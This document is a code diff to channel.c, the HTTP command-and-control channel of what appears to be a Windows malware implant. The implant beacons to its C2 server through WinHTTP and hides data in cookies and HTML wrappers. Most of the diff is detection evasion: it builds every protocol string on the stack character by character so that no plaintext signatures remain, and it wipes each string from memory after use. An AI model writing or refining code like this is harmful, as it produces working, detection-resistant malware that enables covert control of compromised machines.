@@ -2,6 +2,10 @@
  * channel.c — HTTP channel via WinHTTP.
  * Sends C2 data as base64url in a cookie (per malleable profile).
  * Receives response as base64 in an HTML wrapper.
+ *
+ * NOTE: All protocol string literals are built on the stack at runtime
+ * (char-by-char assignment) to avoid plaintext signatures in .rdata.
+ * Each is wiped with SecureZeroMemory after use.
  */
 #include "agent.h"
 
@@ -117,17 +121,31 @@ unsigned char *profile_decode_response(const char *body, DWORD body_len,
      *
      * Find the base64 data between the wrappers.
      */
-    const char *start = strstr(body, "display:none\">");
+
+    /* Stack-built marker: display:none"> — no .rdata footprint */
+    char _m1[15];
+    _m1[0]='d'; _m1[1]='i'; _m1[2]='s'; _m1[3]='p'; _m1[4]='l';
+    _m1[5]='a'; _m1[6]='y'; _m1[7]=':'; _m1[8]='n'; _m1[9]='o';
+    _m1[10]='n'; _m1[11]='e'; _m1[12]='"'; _m1[13]='>'; _m1[14]=0;
+
+    const char *start = strstr(body, _m1);
     if (!start) {
         /* Fallback: try to find base64 directly */
         start = body;
     } else {
-        start += strlen("display:none\">");
+        start += sizeof(_m1) - 1;
         /* Skip whitespace/newlines */
         while (*start == '\n' || *start == '\r' || *start == ' ') start++;
     }
+    SecureZeroMemory(_m1, sizeof(_m1));
 
-    const char *end = strstr(start, "</div>");
+    /* Stack-built marker: </div> */
+    char _m2[7];
+    _m2[0]='<'; _m2[1]='/'; _m2[2]='d'; _m2[3]='i'; _m2[4]='v';
+    _m2[5]='>'; _m2[6]=0;
+
+    const char *end = strstr(start, _m2);
+    SecureZeroMemory(_m2, sizeof(_m2));
     if (!end) end = body + body_len;
 
     /* Trim trailing whitespace */
@@ -211,7 +229,14 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
      * Threshold: 8000 bytes of base64 (safe for most HTTP stacks).
      */
     BOOL use_post = (b64_len > 8000);
-    const wchar_t *method = use_post ? L"POST" : L"GET";
+
+    /* Stack-built HTTP methods — no L"POST"/L"GET" in .rdata */
+    wchar_t _wPost[5];
+    _wPost[0]=L'P'; _wPost[1]=L'O'; _wPost[2]=L'S'; _wPost[3]=L'T'; _wPost[4]=0;
+    wchar_t _wGet[4];
+    _wGet[0]=L'G'; _wGet[1]=L'E'; _wGet[2]=L'T'; _wGet[3]=0;
+    const wchar_t *method = use_post ? _wPost : _wGet;
+
     DBG("[http] payload b64_len=%u, using %s", b64_len, use_post ? "POST" : "GET+cookie");
 
     /* Open request */
@@ -220,6 +245,11 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     HINTERNET hRequest = WinHttpOpenRequest(
         hConnect, method, path, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+
+    /* Method strings consumed — wipe from stack */
+    SecureZeroMemory(_wPost, sizeof(_wPost));
+    SecureZeroMemory(_wGet, sizeof(_wGet));
+
     if (!hRequest) {
         DWORD err = GetLastError();
         DBG("[http] WinHttpOpenRequest FAILED (err=%u / 0x%08X)", err, err);
@@ -260,7 +290,14 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     char ua_dec[512];
     DECRYPT_CONFIG(ua_dec, USER_AGENT);
     char ua_header[768];
-    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua_dec);
+    /* Stack-built format: "User-Agent: %s" */
+    char _uafmt[15];
+    _uafmt[0]='U'; _uafmt[1]='s'; _uafmt[2]='e'; _uafmt[3]='r';
+    _uafmt[4]='-'; _uafmt[5]='A'; _uafmt[6]='g'; _uafmt[7]='e';
+    _uafmt[8]='n'; _uafmt[9]='t'; _uafmt[10]=':'; _uafmt[11]=' ';
+    _uafmt[12]='%'; _uafmt[13]='s'; _uafmt[14]=0;
+    snprintf(ua_header, sizeof(ua_header), _uafmt, ua_dec);
+    SecureZeroMemory(_uafmt, sizeof(_uafmt));
     SecureZeroMemory(ua_dec, sizeof(ua_dec));
     wchar_t *wUA = to_wide(ua_header);
     SecureZeroMemory(ua_header, sizeof(ua_header));
@@ -290,9 +327,19 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     BOOL ok;
     if (use_post) {
         /* Large payload: send as POST body with Content-Type */
-        WinHttpAddRequestHeaders(hRequest,
-            L"Content-Type: application/octet-stream", (DWORD)-1,
+        /* Stack-built header: L"Content-Type: application/octet-stream" */
+        wchar_t _ct[39];
+        _ct[0]=L'C'; _ct[1]=L'o'; _ct[2]=L'n'; _ct[3]=L't'; _ct[4]=L'e';
+        _ct[5]=L'n'; _ct[6]=L't'; _ct[7]=L'-'; _ct[8]=L'T'; _ct[9]=L'y';
+        _ct[10]=L'p'; _ct[11]=L'e'; _ct[12]=L':'; _ct[13]=L' ';
+        _ct[14]=L'a'; _ct[15]=L'p'; _ct[16]=L'p'; _ct[17]=L'l'; _ct[18]=L'i';
+        _ct[19]=L'c'; _ct[20]=L'a'; _ct[21]=L't'; _ct[22]=L'i'; _ct[23]=L'o';
+        _ct[24]=L'n'; _ct[25]=L'/'; _ct[26]=L'o'; _ct[27]=L'c'; _ct[28]=L't';
+        _ct[29]=L'e'; _ct[30]=L't'; _ct[31]=L'-'; _ct[32]=L's'; _ct[33]=L't';
+        _ct[34]=L'r'; _ct[35]=L'e'; _ct[36]=L'a'; _ct[37]=L'm'; _ct[38]=0;
+        WinHttpAddRequestHeaders(hRequest, _ct, (DWORD)-1,
             WINHTTP_ADDREQ_FLAG_ADD);
+        SecureZeroMemory(_ct, sizeof(_ct));
         DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
         ok = WinHttpSendRequest(hRequest,
                 WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -301,10 +348,23 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         /* Small payload: embed in Cookie header (stealthier) */
         char ck_name_dec[64];
         DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);
+
+        /* Stack-built prefix "Cookie: " and format "Cookie: %s=%s" */
+        char _ckpfx[9];
+        _ckpfx[0]='C'; _ckpfx[1]='o'; _ckpfx[2]='o'; _ckpfx[3]='k';
+        _ckpfx[4]='i'; _ckpfx[5]='e'; _ckpfx[6]=':'; _ckpfx[7]=' '; _ckpfx[8]=0;
+        char _ckfmt[14];
+        _ckfmt[0]='C'; _ckfmt[1]='o'; _ckfmt[2]='o'; _ckfmt[3]='k';
+        _ckfmt[4]='i'; _ckfmt[5]='e'; _ckfmt[6]=':'; _ckfmt[7]=' ';
+        _ckfmt[8]='%'; _ckfmt[9]='s'; _ckfmt[10]='='; _ckfmt[11]='%';
+        _ckfmt[12]='s'; _ckfmt[13]=0;
+
         /* Dynamic alloc for cookie header to avoid fixed buffer overflow */
-        DWORD hdr_size = (DWORD)(strlen("Cookie: ") + strlen(ck_name_dec) + 1 + b64_len + 1);
+        DWORD hdr_size = (DWORD)(strlen(_ckpfx) + strlen(ck_name_dec) + 1 + b64_len + 1);
         char *cookie_hdr = (char *)malloc(hdr_size);
-        snprintf(cookie_hdr, hdr_size, "Cookie: %s=%s", ck_name_dec, b64_val);
+        snprintf(cookie_hdr, hdr_size, _ckfmt, ck_name_dec, b64_val);
+        SecureZeroMemory(_ckpfx, sizeof(_ckpfx));
+        SecureZeroMemory(_ckfmt, sizeof(_ckfmt));
         SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
         wchar_t *wCookie = to_wide(cookie_hdr);
         WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
